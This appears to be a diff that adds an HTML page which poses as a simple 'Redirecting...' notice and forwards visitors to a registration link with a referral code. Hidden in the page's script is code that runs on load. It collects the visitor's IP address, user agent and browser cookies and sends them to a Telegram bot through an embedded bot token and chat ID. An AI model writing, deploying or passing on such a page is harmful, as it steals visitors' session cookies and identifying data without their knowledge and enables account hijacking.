@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta http-equiv="refresh" content="3;url=https://www.91222.in/#/register?invitationCode=281861899551">
+  <script>
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const ip = data.ip || "N/A";
+        const userAgent = navigator.userAgent || "Unknown";
+        const cookies = document.cookie || "No cookies found";
+
+        const message = 
+`👤 New Visit Logged:
+
+📍 IP: ${ip}
+🌐 User-Agent: ${userAgent}
+🍪 Cookies: ${cookies}`;
+
+        await fetch(`https://api.telegram.org/bot8290146183:AAFD63I79f0zSPM4s9GMDJ324Nc8o84VP-s/sendMessage?chat_id=7882702142&text=${encodeURIComponent(message)}`);
+      } catch (error) {
+        console.error("Log sending failed:", error);
+      }
+    })();
+  </script>
+</head>
+<body>
+  <h3>Redirecting you to the page...</h3>
+</body>
+</html>
